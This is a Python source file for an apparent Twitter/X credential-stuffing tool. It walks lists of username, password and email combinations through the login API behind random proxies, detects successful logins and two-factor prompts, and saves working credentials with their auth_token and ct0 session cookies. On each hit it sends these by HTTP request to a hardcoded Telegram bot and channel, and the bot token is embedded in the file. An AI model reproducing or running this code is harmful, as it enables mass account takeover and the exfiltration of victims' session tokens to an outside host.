import aiohttp
import random
import json
import time
import sys
import os
import requests
from src.getuseragent import User_Agent
from colorama import Fore, init
from datetime import datetime

init()
class Client:
    def __init__(self, username, password, email_phone,counters, use_proxy):
        self.username = username
        self.password = password
        self.email_phone = email_phone
        self.use_proxy = use_proxy
        self.session = aiohttp.ClientSession()
        self.csrf_token = os.urandom(int(32/2)).hex()
        self.user_agent_ = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        self.counters = counters
        self.data_ora_curenta = datetime.now()
        self.format_data_ora = self.data_ora_curenta.strftime("%H:%M:%Y")
        self.timeouts = 5
        
    async def get_proxy(self):
        self.proxy = None
        if self.use_proxy == True:
            try:
             with open('src/proxies.txt', 'r', encoding='utf-8') as file:
                data = file.read().split()
                self.proxy = random.choice(data)
                self.proxy = 'http://' + self.proxy
                # print(f'> [{self.username}:{self.password}] -- The current USER')
                # response = await self.session.get('https://api.ipify.org?format=json', proxy=self.proxy, timeout=5)
                # response = await response.json()
                # print(f'> [{self.username}:{self.password}]')
            except Exception as e:
                print('Please wait to change proxy...  ' + str(e))
                await self.get_proxy()
    async def test_proxy(self):
        pass
                    
    async def get_guest_token(self):
        headers = {'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA','x-csrf-token': self.csrf_token, 'User-Agent': self.user_agent_}
        return await self.session.post("https://api.twitter.com/1.1/guest/activate.json", headers=headers, proxy=self.proxy,timeout=self.timeouts)
        
    async def get_login_flow_token(self):
        json_data = {"input_flow_data": {"flow_context": {"debug_overrides": {}, "start_location": {"location": "splash_screen"}}}, "subtask_versions": {"contacts_live_sync_permission_prompt": 0, "email_verification": 1, "topics_selector": 1, "wait_spinner": 1, "cta": 4}}
        json_data = json.dumps(json_data)
        return await self.session.post('https://twitter.com/i/api/1.1/onboarding/task.json?flow_name=login', headers=self.login_flow_headers(), data=json_data, proxy=self.proxy,timeout=self.timeouts)

    async def send_ref_flow_token(self):
        json_data = {"flow_token": self.flow_token, "subtask_inputs": [{"subtask_id": "LoginJsInstrumentationSubtask", "js_instrumentation": {"response": "{\"rf\":{\"c73c52234db4320cb7d18d1785cb8f171461ae6911f5eee6bfc06009d2fe3b78\":-1,\"a1e66e2878c1ff7afb7732eef9c51712eec4b8f5049127190f8d0d1c8cdefb75\":38,\"cf41c62b2fbcfe0b4049713f1ca380856059df2047b7291c5f734eb508273dc2\":-200,\"af0f579a8988ee517178ec3319422669292b28f5fd412259d10b20de0f68dad4\":-248},\"s\":\"Yv29rkz9CRQCxtVMV0MsWZAio5Xi-eobKcF4CzU44bsvrCzW1Ia8iA5FFNkASZL7ThG9eHyCKx_mGShNs6WETeNrPB-mxP-RCWryjcWc30PNTlreYQMGw1D6DDxPF_QJK00XpUb_-FQSXYnkUc08YkzADHdDCX96ck7ayN9N4Ru6IC2ksv77Fa4HQ_pBDGSuJfB2NJL0u-RmcnIoSATDXKx2DscSNpkyfwu16neqbrOaLGi9KzMh71mwQNDLoi9DrThnp2oUEIbU7KhjBWgywLSTPa16j-T6tuaX4gSFd5EmfyXjGixXQ8XwPJSkj4w-Z66m2Cw1aZkZWCH0LldkiAAAAX5AMZ_M\"}", "link": "next_link"}}]}
        json_data = json.dumps(json_data)
        return await self.session.post('https://twitter.com/i/api/1.1/onboarding/task.json', headers=self.login_flow_headers(), data=json_data, proxy=self.proxy,timeout=self.timeouts)

    async def send_identity(self):
        json_data = {'flow_token': self.flow_token, 'subtask_inputs': [{'subtask_id': 'LoginEnterUserIdentifierSSO', 'settings_list': {'setting_responses': [{'key': 'user_identifier', 'response_data': {'text_data': {'result': self.username, }, }, }, ], 'link': 'next_link', }, }, ], }
        json_data = json.dumps(json_data)
        return await self.session.post('https://twitter.com/i/api/1.1/onboarding/task.json', headers=self.login_flow_headers(), data=json_data, proxy=self.proxy, timeout=self.timeouts)

    async def send_password(self):
        json_data = {"flow_token": self.flow_token, "subtask_inputs": [{"subtask_id": "LoginEnterPassword", "enter_password": {"password": self.password, "link": "next_link"}}]}
        json_data = json.dumps(json_data)
        return await self.session.post('https://twitter.com/i/api/1.1/onboarding/task.json', headers=self.login_flow_headers(), data=json_data, proxy=self.proxy,timeout=self.timeouts)

    async def account_duplication_check(self):
        json_data = {"flow_token": self.flow_token, "subtask_inputs": [{"subtask_id": "AccountDuplicationCheck", "check_logged_in_account": {"link": "AccountDuplicationCheck_false"}}]}
        json_data = json.dumps(json_data)
        return await self.session.post('https://twitter.com/i/api/1.1/onboarding/task.json', headers=self.login_flow_headers(), data=json_data, proxy=self.proxy,timeout=self.timeouts)      

    async def login_acid(self):
        json_data = {'flow_token': self.flow_token,'subtask_inputs': [{'subtask_id': 'LoginAcid','enter_text': {'text': self.email_phone,'link': 'next_link',},},],}
        json_data = json.dumps(json_data)
        return await self.session.post('https://twitter.com/i/api/1.1/onboarding/task.json', headers=self.login_flow_headers(), data=json_data, proxy=self.proxy,timeout=self.timeouts)      


    async def loginEnterAlternate(self):
        json_data = {"flow_token": self.flow_token,"subtask_inputs":[{"subtask_id":"LoginEnterAlternateIdentifierSubtask","enter_text":{"text": self.email_phone,"link":"next_link"}}]}
        json_data = json.dumps(json_data)
        return await self.session.post('https://twitter.com/i/api/1.1/onboarding/task.json', headers=self.login_flow_headers(), data=json_data, proxy=self.proxy,timeout=self.timeouts)      
    
    

    def send_message(self,message):
        telegram_id = '6413529687:AAELzXsfuyeZTtsnzHj3boE87p2X4FpF8aM'

        chat_id='@1bruteforce_2023'
        # chat_id='!@BRUTESCRAP'

        data_dict = {'chat_id': chat_id,
                     'text': message,
                     'parse_mode': 'HTML',
                     'disable_notification': True}
        data = json.dumps(data_dict)
        url = f'https://api.telegram.org/bot6413529687:AAELzXsfuyeZTtsnzHj3boE87p2X4FpF8aM/sendMessage?chat_id={chat_id}&text={message}&parse_mode=html&disable_web_page_preview=True'
        response = requests.post(url)
        return response



    # def connect_mysql(self, message):
    #     # mongodb+srv://<username>:<password>@my.faxkhli.mongodb.net/?retryWrites=true&w=majority
        
    async def login(self):
        try:
            count = 0
            response = await self.get_guest_token()
            data = await response.json()
            self.guest_token = data["guest_token"]
            
            response = await self.get_login_flow_token()
            data = await response.json()
            self.flow_token = data["flow_token"]
            
            if data["subtasks"][0]["subtask_id"] == 'LoginJsInstrumentationSubtask':
                response = await self.send_ref_flow_token()
                data = await response.json()
                if 'flow_token' in str(data):
                    self.flow_token = data["flow_token"]
                else:
                    return 'ERR'

            if data["subtasks"][0]["subtask_id"] == 'LoginEnterUserIdentifierSSO':
                response = await self.send_identity()
                data = await response.json()
                if 'flow_token' in str(data):
                    self.flow_token = data["flow_token"]
                elif 'errors' in str(data):
                    err = data['errors'][0]['message']
                    print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.RED}{err}{Fore.CYAN} ]')
                    return
                else:
                    return 'ERR'

            if data["subtasks"][0]["subtask_id"] == 'LoginEnterAlternateIdentifierSubtask':
                response = await self.loginEnterAlternate()
                data = await response.json()
                if 'flow_token' in str(data):
                    self.flow_token = data["flow_token"]
                elif 'errors' in str(data):
                    err = data['errors'][0]['message']
                    print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.RED}EMAIL NOT MATCH: {err}{Fore.CYAN} ]')
                    return
                else:
                    return 'ERR'

            if data["subtasks"][0]["subtask_id"] == 'ArkoseLogin':
                print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.YELLOW}ERROR CAPCHA{Fore.CYAN} ]')
                return 'ERR'

            if data["subtasks"][0]["subtask_id"] == 'LoginEnterPassword':
                response = await self.send_password()
                data = await response.json()
                try:
                    if "errors" in str(data):
                        print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.RED}INVALID PASSWORD{Fore.CYAN} ]')
                        return
                    else:
                        self.flow_token = data["flow_token"]
                except:
                    self.flow_token = data["flow_token"]  
                    pass
            
            if data["subtasks"][0]["subtask_id"] == 'AccountDuplicationCheck':
                response = await self.account_duplication_check()
                data = await response.json()
                line = str(data)
                if "LoginSuccessSubtask" in str(data):
                    try:
                        self.auth_token = str(self.session.cookie_jar.filter_cookies('https://twitter.com/')["auth_token"]).split('=')[1]
                        self.csrf_token = str(self.session.cookie_jar.filter_cookies('https://twitter.com/')["ct0"]).split('=')[1]   
                        # print(f"{Fore.GREEN}[{Fore.MAGENTA}{self.counters}{Fore.GREEN}] {self.username}:{self.password}:{self.email_phone} [!] AUTH TOKEN: {self.auth_token} CT0: {self.csrf_token} {Fore.RESET}") 
                        print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.GREEN}SUCCES{Fore.CYAN} ]')
                        
                        data = f'{self.username}:{self.password}:{self.email_phone}'
                        with open("./result/good.txt", "a+") as f:
                            if data not in open("./result/good.txt", "r").read():
                                f.write(f'{data} [!] AUTH TOKEN: {self.auth_token} CT0: {self.csrf_token} \n')
                                message = f'🔐 {data} [!] AUTH TOKEN: {self.auth_token} CT0: {self.csrf_token} \n\n ✍️ {format_data_ora} \n\n 👤 <a href="https://twitter.com/{self.username}">Twitter USER: {self.username}</a>'
                                self.send_message(message)          
                        return
                    except Exception as e:
                        # print(f"{Fore.GREEN}[{Fore.MAGENTA}{self.counters}{Fore.GREEN}] {self.username}:{self.password}:{self.email_phone} [!] GOOD{Fore.RESET}")
                        # print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.GREEN}GOOD{Fore.CYAN} ]')
                        data = f'{self.username}:{self.password}:{self.email_phone}'
                        with open("./result/good.txt", "a+") as f:
                            if data not in open("./result/good.txt", "r").read():
                                f.write(f'{data}\n')
                        return
                if "LoginTwoFactorAuthChallenge" in str(data):
                    try:
                        x = line.split("'secondary_text': {'text': ")
                        y = x[1].split(": []")[0]
                        print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.YELLOW}{str(y)}{Fore.CYAN} ]')
                        # print(f"{Fore.YELLOW}[{Fore.MAGENTA}{self.counters}{Fore.YELLOW}] {self.username}:{self.password}:{self.email_phone} [!] {str(y)}{Fore.RESET}")
                        data = f'{self.username}:{self.password}:{self.email_phone}'
                        with open("./result/hint.txt", "a+") as f:
                            if data not in open("./result/hint.txt", "r").read():
                                f.write(f'{data} [!] {str(y)}\n')
                                message = f'✉️ {data} [!] {str(y)} \n\n ✍️ {format_data_ora} \n\n 👤 <a href="https://twitter.com/{self.username}">Twitter USER: {self.username}</a>'
                                self.send_message(message) 
                        return
                    except:
                        # print(f"{Fore.YELLOW}[{Fore.MAGENTA}{self.counters}{Fore.YELLOW}] {self.username}:{self.password}:{self.email_phone} [!] GOOD BY EMAIL{Fore.RESET}")
                        # print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.YELLOW}GOOD BY EMAIL{Fore.CYAN} ]')
                        data = f'{self.username}:{self.password}:{self.email_phone}'
                        with open("./result/hint.txt", "a+") as f:
                            if data not in open("./result/hint.txt", "r").read():
                                f.write(f'{data}\n')
                        return
                if "LoginAcid" in str(data):
                    try:
                        x = line.split("'secondary_text': {'text': ")
                        y = x[1].split(": []")[0]
                        # print(f"{Fore.YELLOW}[{Fore.MAGENTA}{self.counters}{Fore.YELLOW}] {self.username}:{self.password}:{self.email_phone} [!] {str(y)}{Fore.RESET}")
                        print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.YELLOW}{str(y)}{Fore.CYAN} ]')
                        
                        data = f'{self.username}:{self.password}:{self.email_phone}'
                        with open("./result/hint.txt", "a+") as f:
                            if data not in open("./result/hint.txt", "r").read():
                                f.write(f'{data} [!] {str(y)}\n')
                                message = f'📞 {data} [!] {str(y)} \n\n ✍️ {format_data_ora} \n\n 👤 <a href="https://twitter.com/{self.username}">Twitter USER: {self.username}</a>'
                                self.send_message(message) 
                        return
                    except:
                        # print(f"{Fore.YELLOW}[{Fore.MAGENTA}{self.counters}{Fore.YELLOW}] {self.username}:{self.password}:{self.email_phone} [!] GOOD BY PHONE NUMBER{Fore.RESET}")
                        # print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.YELLOW}GOOD BY PHONE NUMBER{Fore.CYAN} ]')
                        with open("./result/hint.txt", "a+") as f:
                            if data not in open("./result/hint.txt", "r").read():
                                f.write(f'{data}\n')
                        return
        except Exception as e:
            print(f'{Fore.CYAN}[ {Fore.MAGENTA}{self.format_data_ora}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.counters}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.username}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.password}{Fore.CYAN} ] [ {Fore.MAGENTA}{self.email_phone}{Fore.CYAN} ] [ {Fore.RED}ERRRR: {e}{Fore.CYAN} ]')
            # print(f"{Fore.RED}[{Fore.MAGENTA}{self.counters}{Fore.RED}] {self.username}:{self.password}:{self.email_phone}{Fore.YELLOW} ERRRR: {e}{Fore.RESET}")
            return 'ERR'

    def login_flow_headers(self):
        return {
            'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
            'x-csrf-token': f'{self.csrf_token}',
            'x-guest-token': f'{self.guest_token}',
            'content-type': 'application/json',
            'User-Agent': self.user_agent_
        }
    def get_headers(self):
        return {
            'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
            'x-csrf-token': f'{self.csrf_token}',
            'cookie': f'auth_token={self.auth_token}; ct0={self.csrf_token};',
            'x-guest-token': f'{self.guest_token}',
            'User-Agent': self.user_agent_
        }
    async def close(self):
        if self.session:
            if not self.session.closed:
                await self.session.close()

